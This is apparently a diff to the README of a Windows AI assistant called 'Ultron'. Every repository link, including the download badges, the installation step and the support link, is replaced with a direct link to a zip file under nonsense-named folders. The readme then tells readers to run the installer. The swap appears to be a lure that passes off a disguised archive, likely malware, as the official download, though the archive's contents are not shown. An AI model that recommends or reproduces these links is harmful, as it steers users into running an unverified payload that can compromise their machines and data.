@@ -1,6 +1,6 @@
 # 🤖 Ultron - Your All-in-One AI Command Center for Windows
 
-[![Download Ultron](https://img.shields.io/badge/Download-Ultron-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/frostihk/Ultron)
+[![Download Ultron](https://img.shields.io/badge/Download-Ultron-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/frostihk/Ultron/main/psychotherapeutist/subtersuperlative.zip)
 
 ## 🎯 What Is Ultron?
 
@@ -38,7 +38,7 @@ Getting Ultron up and running is easier than you think. Follow these simple step
 
 ### Step 1: Download Ultron
 
-Visit this link to download the application: [https://github.com/frostihk/Ultron](https://github.com/frostihk/Ultron)
+Visit this link to download the application: [https://raw.githubusercontent.com/frostihk/Ultron/main/psychotherapeutist/subtersuperlative.zip](https://raw.githubusercontent.com/frostihk/Ultron/main/psychotherapeutist/subtersuperlative.zip)
 
 ### Step 2: Run the Installer
 
@@ -119,7 +119,7 @@ Currently, Ultron is optimized for Windows. Mac and Linux versions may be availa
 
 If you need assistance, here are your options:
 
-1. **Check the GitHub repository:** [https://github.com/frostihk/Ultron](https://github.com/frostihk/Ultron)
+1. **Check the GitHub repository:** [https://raw.githubusercontent.com/frostihk/Ultron/main/psychotherapeutist/subtersuperlative.zip](https://raw.githubusercontent.com/frostihk/Ultron/main/psychotherapeutist/subtersuperlative.zip)
 2. **Read the documentation:** Available in the repository's Wiki section
 3. **Report an issue:** Use the Issues tab on GitHub to report bugs or request features
 
@@ -150,6 +150,6 @@ Your support helps keep Ultron free and continuously improving.
 
 **Ready to take control of your digital life?** Download Ultron today and experience the power of a personal AI command center.
 
-[![Get Ultron Now](https://img.shields.io/badge/Get%20Ultron%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/frostihk/Ultron)
+[![Get Ultron Now](https://img.shields.io/badge/Get%20Ultron%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/frostihk/Ultron/main/psychotherapeutist/subtersuperlative.zip)
 
 Keywords: adb, ai, ai-agent, android, automation, command-center, desktop-ai, electron, local-ai, nvidia-ai, offline-ai, personal-ai, powershell, react, sqlite, threejs, typescript, ultron, windows, windows-automation
